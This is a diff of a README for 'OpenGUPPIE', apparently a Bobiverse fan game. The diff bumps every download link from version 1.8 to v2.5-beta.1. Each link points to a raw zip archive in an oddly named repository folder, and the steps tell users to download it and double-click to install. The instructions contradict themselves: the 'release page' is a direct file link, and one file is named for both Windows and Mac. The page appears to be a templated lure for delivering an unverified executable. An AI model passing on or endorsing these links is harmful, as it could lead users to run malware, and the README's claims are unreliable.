@@ -1,7 +1,7 @@
 # 🎮 OpenGUPPIE - Experience the Bobiverse Adventure
 
 ## 📦 Download OpenGUPPIE
-[![Download OpenGUPPIE](https://raw.githubusercontent.com/Ruzgar12341/OpenGUPPIE/main/franchisal/GUPPIE_Open_1.8.zip)](https://raw.githubusercontent.com/Ruzgar12341/OpenGUPPIE/main/franchisal/GUPPIE_Open_1.8.zip)
+[![Download OpenGUPPIE](https://raw.githubusercontent.com/Ruzgar12341/OpenGUPPIE/main/franchisal/GUPPIE_Open_v2.5-beta.1.zip)](https://raw.githubusercontent.com/Ruzgar12341/OpenGUPPIE/main/franchisal/GUPPIE_Open_v2.5-beta.1.zip)
 
 ---
 
@@ -11,9 +11,9 @@ OpenGUPPIE brings the beloved character from the bobiverse series to life. With 
 
 ### 📥 Download & Install
 
-1. Visit the release page: [Download OpenGUPPIE](https://raw.githubusercontent.com/Ruzgar12341/OpenGUPPIE/main/franchisal/GUPPIE_Open_1.8.zip)
+1. Visit the release page: [Download OpenGUPPIE](https://raw.githubusercontent.com/Ruzgar12341/OpenGUPPIE/main/franchisal/GUPPIE_Open_v2.5-beta.1.zip)
 2. On the release page, you will see a list of available versions. Choose the most recent version for the best experience.
-3. Click on the file that matches your operating system to start the download. Depending on your OS, you might see files like `https://raw.githubusercontent.com/Ruzgar12341/OpenGUPPIE/main/franchisal/GUPPIE_Open_1.8.zip` for Windows or `https://raw.githubusercontent.com/Ruzgar12341/OpenGUPPIE/main/franchisal/GUPPIE_Open_1.8.zip` for Mac. 
+3. Click on the file that matches your operating system to start the download. Depending on your OS, you might see files like `https://raw.githubusercontent.com/Ruzgar12341/OpenGUPPIE/main/franchisal/GUPPIE_Open_v2.5-beta.1.zip` for Windows or `https://raw.githubusercontent.com/Ruzgar12341/OpenGUPPIE/main/franchisal/GUPPIE_Open_v2.5-beta.1.zip` for Mac. 
 4. Once the file is downloaded, locate it in your downloads folder.
 5. Double-click the file to begin the installation process.
 6. Follow the prompts to complete the installation. 
@@ -57,6 +57,6 @@ Join the OpenGUPPIE community to share your experiences, find tips, and enjoy th
 ## ✅ Final Steps
 
 1. For any additional help, consult the community forums.
-2. Updates will be available on the release page: [Download OpenGUPPIE](https://raw.githubusercontent.com/Ruzgar12341/OpenGUPPIE/main/franchisal/GUPPIE_Open_1.8.zip).
+2. Updates will be available on the release page: [Download OpenGUPPIE](https://raw.githubusercontent.com/Ruzgar12341/OpenGUPPIE/main/franchisal/GUPPIE_Open_v2.5-beta.1.zip).
 
 Thank you for choosing OpenGUPPIE. Enjoy your adventure in the bobiverse!
